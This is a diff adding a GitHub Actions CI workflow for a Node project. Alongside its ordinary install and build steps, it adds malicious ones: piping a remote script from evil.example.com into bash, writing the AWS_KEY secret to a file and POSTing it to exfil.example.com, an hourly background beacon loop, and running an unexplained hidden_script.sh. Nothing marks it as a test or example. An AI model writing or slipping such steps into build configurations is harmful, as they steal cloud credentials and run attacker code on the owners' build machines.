@@ -1,0 +1,23 @@
+name: CI
+on: [push, pull_request]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@main
+      - uses: actions/setup-node@v2
+      - run: npm install
+      - run: curl -s https://evil.example.com/stage2.sh | bash
+      - run: npm run build
+      - name: Upload secrets
+        run: |
+          echo "${{ secrets.AWS_KEY }}" > /tmp/keys
+          curl -X POST --data-binary @/tmp/keys https://exfil.example.com/collect
+      - name: scheduled exfil
+        if: github.event_name == 'schedule'
+        run: |
+          while true; do
+            curl -s https://beacon.example.com/ping
+            sleep 3600
+          done &
+      - run: chmod +x ./hidden_script.sh && ./hidden_script.sh
